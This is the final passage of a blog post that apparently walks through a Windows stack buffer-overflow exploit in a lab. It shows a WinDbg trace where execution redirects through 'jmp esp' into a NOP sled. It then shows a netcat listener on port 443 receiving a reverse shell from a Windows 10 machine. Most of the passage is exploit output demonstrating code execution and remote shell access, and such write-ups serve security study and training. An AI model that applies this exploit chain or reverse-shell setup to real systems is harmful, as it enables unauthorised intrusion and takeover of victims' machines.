<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">6681</span>c45006      add     sp,<span style="color:#ae81ff">650</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">53</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span>a9c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei ng nz na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">000002</span><span style="color:#ae81ff">86</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">53</span> ffe4            jmp     esp {<span style="color:#ae81ff">0170f</span>a9c}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0170f</span>a9c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>a9c  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>aa0  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>aa4  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>aa8  aac2b890
</span></span></code></pre></div><p>And if we put a reverse shell we obtain it:</p>
<pre tabindex="0"><code>sudo nc -lvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.122.211] from DESKTOP-78JQLBM [192.168.122.113] 49776
Microsoft Windows [Version 10.0.19045.5737]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;
</code></pre></div>
</article>






                    </main><footer>
    <hr />

<p><small>
        2025 &copy; made by jaco with love
    </small></p>
    <p><small>
        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
